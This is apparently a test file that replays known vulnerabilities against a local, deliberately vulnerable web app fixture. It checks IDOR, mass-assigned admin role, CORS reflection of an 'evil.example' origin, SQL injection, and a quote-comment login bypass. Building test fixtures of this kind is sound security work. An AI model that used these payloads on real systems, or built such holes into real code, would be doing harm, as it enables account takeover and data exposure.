import { afterAll, beforeAll, describe, expect, test } from "bun:test"
import { startSecurityTarget, type SecurityTargetFixture } from "../fixture/security-target"

let app: SecurityTargetFixture

async function json(input: Response) {
  return input.json() as Promise<Record<string, any>>
}

function jwtPayload(token: string) {
  const body = token.split(".")[1] ?? ""
  return JSON.parse(Buffer.from(body, "base64url").toString("utf8")) as Record<string, any>
}

beforeAll(() => {
  app = startSecurityTarget()
})

afterAll(() => {
  app.stop()
})

describe("truthful security fixture", () => {
  test("replays the high-impact vulnerability set without challenge leakage", async () => {
    const reg = await fetch(`${app.baseUrl}/api/Users`, {
      method: "POST",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify({
        email: "fixture-user@example.com",
        password: "Test12345!",
        passwordRepeat: "Test12345!",
      }),
    })
    expect(reg.status).toBe(201)

    const login = await fetch(`${app.baseUrl}/rest/user/login`, {
      method: "POST",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify({
        email: "fixture-user@example.com",
        password: "Test12345!",
      }),
    })
    expect(login.status).toBe(200)
    const loginBody = await json(login)
    const token = String(loginBody.authentication.token)
    expect(token.length).toBeGreaterThan(10)

    const payload = jwtPayload(token)
    expect(payload.exp).toBeUndefined()
    expect(payload.data.password).toBeString()
    expect(payload.data.role).toBe("customer")

    const idor = await fetch(`${app.baseUrl}/api/Users/1`, {
      headers: {
        authorization: `Bearer ${token}`,
      },
    })
    expect(idor.status).toBe(200)
    const idorBody = await json(idor)
    expect(idorBody.email).toBe(app.admin.email)
    expect(idorBody.role).toBe("admin")

    const mass = await fetch(`${app.baseUrl}/api/Users`, {
      method: "POST",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify({
        email: "fixture-admin@example.com",
        password: "Test12345!",
        passwordRepeat: "Test12345!",
        role: "admin",
      }),
    })
    expect(mass.status).toBe(201)
    const massBody = await json(mass)
    expect(massBody.data.role).toBe("admin")

    const cors = await fetch(`${app.baseUrl}/api/private/profile`, {
      headers: {
        cookie: app.cookieFor(1),
        origin: "https://evil.example",
      },
    })
    expect(cors.status).toBe(200)
    expect(cors.headers.get("access-control-allow-origin")).toBe("https://evil.example")
    expect(cors.headers.get("access-control-allow-credentials")).toBe("true")

    const metrics = await fetch(`${app.baseUrl}/metrics`)
    expect(metrics.status).toBe(200)
    expect(await metrics.text()).toContain("process_cpu_user_seconds_total")

    const sqli = await fetch(`${app.baseUrl}/rest/user/login`, {
      method: "POST",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify({
        email: "' UNION SELECT NULL--",
        password: "x",
      }),
    })
    expect(sqli.status).toBe(500)
    const sqliBody = (await sqli.text()).toLowerCase()
    expect(sqliBody).toContain("sequelize")
    expect(sqliBody).toContain("sqlite")

    const bypass = await fetch(`${app.baseUrl}/rest/user/login`, {
      method: "POST",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify({
        email: `${app.admin.email}'--`,
        password: "x",
      }),
    })
    expect(bypass.status).toBe(200)
    const bypassBody = await json(bypass)
    expect(String(bypassBody.authentication.token).length).toBeGreaterThan(10)
    expect(bypassBody.data.email).toBe(app.admin.email)
  })
})
